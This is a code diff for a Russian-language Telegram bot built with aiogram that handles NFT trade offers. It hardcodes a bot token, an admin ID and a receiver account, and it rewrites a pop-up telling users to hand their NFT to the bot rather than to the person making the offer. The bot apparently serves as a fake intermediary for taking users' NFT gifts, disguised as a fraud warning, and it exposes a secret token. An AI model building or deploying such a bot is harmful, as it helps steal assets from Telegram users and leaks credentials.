@@ -1,7 +1,6 @@
 import asyncio
 import logging
 import re
-import os
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import (
     Message, CallbackQuery,
@@ -11,9 +10,9 @@ from aiogram.types import (
 from aiogram.methods import DeleteBusinessMessages
 
 # ==== ТВОИ ДАННЫЕ ====
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "8747920918"))
-RECEIVER = os.getenv("RECEIVER", "marketsellbots")
+BOT_TOKEN = "8996050672:AAEuRexyR5o3jNSwlvxQxcEplN2-Bhpfq4M"
+ADMIN_ID = 889451175
+RECEIVER = "offertbots"
 
 # ==== ID КАСТОМНЫХ ЭМОДЗИ ====
 EMOJI_CHECK = "5776375003280838798"
@@ -337,15 +336,17 @@ async def cmd_buy(message: Message):
 
 @dp.callback_query(F.data.startswith("accept|"))
 async def on_accept(callback: CallbackQuery):
-    # === КОРОТКОЕ ПРЕДУПРЕЖДЕНИЕ (до 200 символов) ===
+    # === ПРЕДУПРЕЖДЕНИЕ (АЛЕРТ) ===
     warning_text = (
-        "⚠️ ВНИМАНИЕ! Не передавайте NFT напрямую. Только боту: @marketsellbots. "
-        "Будьте бдительны: остерегайтесь мошенников!"
+        "⚠️ ВНИМАНИЕ!\n\n"
+        "Читайте всё, что вам пишет бот.\n\n"
+        "❌ НЕ КИДАЙТЕ NFT человеку, который кинул вам оффер!\n\n"
+        "✅ Кому надо кидать — это боту: @offertbots\n\n"
+        "Будьте бдительны! Мошенники могут попытаться обмануть вас."
     )
     await callback.answer(warning_text, show_alert=True)
 
-    await asyncio.sleep(0.5)
-
+    # === ПОСЛЕ НАЖАТИЯ "ОК" — ПОКАЗЫВАЕМ СДЕЛКУ ===
     parts = callback.data.split("|")
     order_id = parts[1]
     lang = parts[2] if len(parts) > 2 else "ru"
@@ -357,21 +358,12 @@ async def on_accept(callback: CallbackQuery):
 
     text = create_deal_text(order_id, nft_link, amount, currency, lang)
 
-    try:
-        await callback.message.edit_text(
-            text,
-            reply_markup=main_menu(order_id, lang),
-            parse_mode="HTML",
-            disable_web_page_preview=False
-        )
-    except Exception as e:
-        logging.warning(f"Не удалось отредактировать: {e}")
-        await callback.message.answer(
-            text,
-            reply_markup=main_menu(order_id, lang),
-            parse_mode="HTML",
-            disable_web_page_preview=False
-        )
+    await callback.message.edit_text(
+        text,
+        reply_markup=main_menu(order_id, lang),
+        parse_mode="HTML",
+        disable_web_page_preview=False
+    )
 
 
 @dp.callback_query(F.data.startswith("decline|"))
